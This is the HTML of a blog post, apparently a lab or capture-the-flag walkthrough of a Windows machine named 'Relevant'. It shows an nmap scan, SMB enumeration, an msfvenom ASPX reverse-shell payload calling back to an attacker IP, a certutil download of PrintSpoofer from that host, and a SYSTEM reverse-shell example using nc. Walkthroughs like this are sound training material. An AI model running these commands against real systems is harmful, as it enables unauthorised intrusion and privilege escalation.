@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Difficulty: MediumScore: 6&#x2F;10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IFORGOTTEN">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[10].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="Difficulty: MediumScore: 6&#x2F;10">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnYnsSVebQaMvO-flJ0Gr2jkv3ra.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn8J_AnJwxgVuJ_GqrLcXlIDJ3GN.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrgGD3BJDLFZ3Z3rU4Pkssr44P2j.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fg5YuvWKzrzAn6b47xyobpID55lP.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnCKVGnIynTUbCWnUn74Lk11A91I.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpYBHG3uf-EUYaYvR9tfuFwRkaSP.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fja5KALg_ZSv6foOfeleacdflAA-.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvEKP9nreEmAfYtBAXBdLKGwBch5.png">
+<meta property="article:published_time" content="2022-01-25T08:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:13.358Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Hack the Box">
+<meta property="article:tag" content="Penetration Test">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnYnsSVebQaMvO-flJ0Gr2jkv3ra.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>IFORGOTTEN</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%20%5B11%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B9%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[10].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&text=IFORGOTTEN"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&is_video=false&description=IFORGOTTEN"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IFORGOTTEN&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[10].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&name=IFORGOTTEN&description=&lt;p&gt;Difficulty: Medium&lt;br&gt;Score: 6&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[10].html&t=IFORGOTTEN"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">1.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">2.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">2.1.1.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smbclient-infomation-collection"><span class="toc-number">2.1.2.</span> <span class="toc-text">Smbclient infomation collection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">2.2.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-number">2.2.1.</span> <span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#We-can-use-printspoofer"><span class="toc-number">2.2.2.</span> <span class="toc-text">We can use printspoofer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">3.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        IFORGOTTEN
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-25T08:18:00.000Z" class="dt-published" itemprop="datePublished">2022-01-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-the-Box/" rel="tag">Hack the Box</a>, <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Difficulty: Medium<br>Score: 6&#x2F;10</p>
+<hr>
+<span id="more"></span>
+
+<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><ol>
+<li>2 flags</li>
+<li>root privilege</li>
+</ol>
+<h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="line-numbers language-none"><code class="language-none"># Nmap 7.92 scan initiated Tue Jan 25 22:44:52 2022 as: nmap -p139,135,80,445,3389,49663,49669,49667 -sV -sC -T4 -Pn -oA 10.10.242.74 10.10.242.74
+Nmap scan report for 10.10.242.74
+Host is up (0.23s latency).
+PORT      STATE SERVICE       VERSION
+80&#x2F;tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS&#x2F;10.0
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+135&#x2F;tcp   open  msrpc         Microsoft Windows RPC
+139&#x2F;tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445&#x2F;tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389&#x2F;tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2022-01-26T03:46:11+00:00
+|_ssl-date: 2022-01-26T03:46:50+00:00; +2s from scanner time.
+| ssl-cert: Subject: commonName&#x3D;Relevant
+| Not valid before: 2022-01-25T03:23:53
+|_Not valid after:  2022-07-27T03:23:53
+49663&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS&#x2F;10.0
+49667&#x2F;tcp open  msrpc         Microsoft Windows RPC
+49669&#x2F;tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows
+Host script results:
+|_clock-skew: mean: 1h36m02s, deviation: 3h34m41s, median: 1s
+| smb2-time:
+|   date: 2022-01-26T03:46:12
+|_  start_date: 2022-01-26T03:24:15
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-01-25T19:46:14-08:00
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+# Nmap done at Tue Jan 25 22:46:48 2022 -- 1 IP address (1 host up) scanned in 116.28 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Smbclient-infomation-collection"><a href="#Smbclient-infomation-collection" class="headerlink" title="Smbclient infomation collection"></a>Smbclient infomation collection</h3><p>smbclient check<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnYnsSVebQaMvO-flJ0Gr2jkv3ra.png"><br>Get the password.txt file<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn8J_AnJwxgVuJ_GqrLcXlIDJ3GN.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrgGD3BJDLFZ3Z3rU4Pkssr44P2j.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fg5YuvWKzrzAn6b47xyobpID55lP.png"><br>cyberchef<br>It can load the file, we can upload the reverse_shell<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnCKVGnIynTUbCWnUn74Lk11A91I.png"><br>But we cannot upload the php-reverse-shell</p>
+<pre class="line-numbers language-none"><code class="language-none">49663&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS&#x2F;10.0
+49667&#x2F;tcp open  msrpc         Microsoft Windows RPC
+49669&#x2F;tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>we can upload the aspx-shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom  <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.11</span>.61.17 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4445</span>  <span class="token parameter variable">-f</span> aspx<span class="token operator">></span> shell.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpYBHG3uf-EUYaYvR9tfuFwRkaSP.png"></p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fja5KALg_ZSv6foOfeleacdflAA-.png"></p>
+<h3 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h3><p>It is very similar to SeImpersonatePrivilege, it will use the same method to get a privileged token.<br>Then, this <strong>privilege allows to assign a primary token</strong> to a new&#x2F;suspended process. With the privileged impersonation token you can derivate a primary token (DuplicateTokenEx).</p>
+<h3 id="We-can-use-printspoofer"><a href="#We-can-use-printspoofer" class="headerlink" title="We can use printspoofer"></a>We can use printspoofer</h3><p><a target="_blank" rel="noopener" href="https://github.com/dievus/printspoofer">https://github.com/dievus/printspoofer</a><br>upload the binary exe and execute it</p>
+<pre class="line-numbers language-none"><code class="language-none">certutil -urlcache -f http:&#x2F;&#x2F;10.11.61.17&#x2F;PrintSpoofer.exe shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell.exe <span class="token parameter variable">-h</span>
+PrintSpoofer v0.1 <span class="token punctuation">(</span>by @itm4n<span class="token punctuation">)</span>
+  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print
+  Spooler <span class="token function">service</span> to get a SYSTEM token and <span class="token keyword">then</span> run a custom <span class="token builtin class-name">command</span> with CreateProcessAsUser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+Arguments:
+  <span class="token parameter variable">-c</span> <span class="token operator">&lt;</span>CMD<span class="token operator">></span>    Execute the <span class="token builtin class-name">command</span> *CMD*
+  <span class="token parameter variable">-i</span>          Interact with the new process <span class="token keyword">in</span> the current <span class="token builtin class-name">command</span> prompt <span class="token punctuation">(</span>default is non-interactive<span class="token punctuation">)</span>
+  <span class="token parameter variable">-d</span> <span class="token operator">&lt;</span>ID<span class="token operator">></span>     Spawn a new process on the desktop corresponding to this session *ID* <span class="token punctuation">(</span>check your ID with qwinsta<span class="token punctuation">)</span>
+  <span class="token parameter variable">-h</span>          That's me <span class="token builtin class-name">:</span><span class="token punctuation">)</span>
+Examples:
+  - Run PowerShell as SYSTEM <span class="token keyword">in</span> the current console
+      PrintSpoofer.exe <span class="token parameter variable">-i</span> <span class="token parameter variable">-c</span> powershell.exe
+  - Spawn a SYSTEM <span class="token builtin class-name">command</span> prompt on the desktop of the session <span class="token number">1</span>
+      PrintSpoofer.exe <span class="token parameter variable">-d</span> <span class="token number">1</span> <span class="token parameter variable">-c</span> cmd.exe
+  - Get a SYSTEM reverse shell
+      PrintSpoofer.exe <span class="token parameter variable">-c</span> <span class="token string">"c:\Temp<span class="token entity" title="\n">\n</span>c.exe 10.10.13.37 1337 -e cmd"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">shell.exe -i -c cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvEKP9nreEmAfYtBAXBdLKGwBch5.png"></p>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">1.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">2.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">2.1.1.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smbclient-infomation-collection"><span class="toc-number">2.1.2.</span> <span class="toc-text">Smbclient infomation collection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">2.2.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-number">2.2.1.</span> <span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#We-can-use-printspoofer"><span class="toc-number">2.2.2.</span> <span class="toc-text">We can use printspoofer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">3.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[10].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&text=IFORGOTTEN"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&is_video=false&description=IFORGOTTEN"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IFORGOTTEN&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[10].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&title=IFORGOTTEN"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[10].html&name=IFORGOTTEN&description=&lt;p&gt;Difficulty: Medium&lt;br&gt;Score: 6&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[10].html&t=IFORGOTTEN"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
